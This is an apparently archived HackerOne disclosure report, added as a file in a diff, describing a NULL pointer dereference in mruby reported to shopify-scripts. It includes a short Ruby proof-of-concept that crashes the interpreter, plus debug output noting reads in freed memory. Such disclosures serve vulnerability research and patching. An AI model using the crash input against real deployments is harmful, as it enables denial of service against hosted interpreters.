@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/215891
+WeaknessName:NULL Pointer Dereference
+Reporter:https://hackerone.com/dgaletic
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:800.0
+Severity:low
+State:Closed
+DateOfDisclosure:15.04.2017 14:45:08
+
+Summary:
+
+PoC
+===
+The following demonstrates a crash:
+
+    if def class
+      A
+      ensure
+        e rescue 0
+      end
+    end
+    [].map.a
+
+Debug info
+==========
+The crash happens due to a null pointer dereference in `mrb_class`, class.h:50.
+
+    50├>    return mrb_obj_ptr(v)->c;
+    
+Valgrind shows several reads inside free'd blocks.
+
+
+Test platform
+=============
+* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3
+
+mruby SHA: 051e40c0493f2de332f5439e3230c9fe6958bf1a
+
+Thank you,
+Dinko Galetic
+Denis Kasak
